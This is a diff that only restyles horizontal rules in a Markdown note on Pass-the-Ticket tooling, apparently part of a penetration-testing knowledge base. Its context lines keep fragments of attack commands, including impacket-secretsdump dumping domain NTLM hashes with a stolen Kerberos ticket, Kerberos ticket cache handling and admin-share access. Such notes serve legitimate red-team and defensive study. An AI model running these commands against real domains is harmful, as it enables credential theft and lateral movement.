@@ -18,7 +18,7 @@ linked:
 ---
 # Pass-the-Ticket - Tooling
 
-***
+---
 
 ## Rubeus
 
@@ -47,7 +47,7 @@ klist
 dir \\target\c$
 ```
 
-___
+---
 
 ## mimikatz kerberos module
 
@@ -74,7 +74,7 @@ exit
 klist
 ```
 
-___
+---
 
 ## impacket (Linux)
 
@@ -97,7 +97,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## klist / kinit (nativos)
 
@@ -111,7 +111,7 @@ ___
 | `kinit -kt service.keytab svc@DOMAIN` | TGT desde keytab | Service accounts. |
 ^ptt-tool-klist
 
-___
+---
 
 ## ticketConverter (standalone)
 
@@ -130,7 +130,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=ticket.ccache
 ```
 
-___
+---
 
 ## Recursos
 
@@ -144,4 +144,4 @@ ___
 | MITRE ATT&CK T1550.003 | `https://attack.mitre.org/techniques/T1550/003/` |
 ^ptt-tool-resources
 
-***
+---
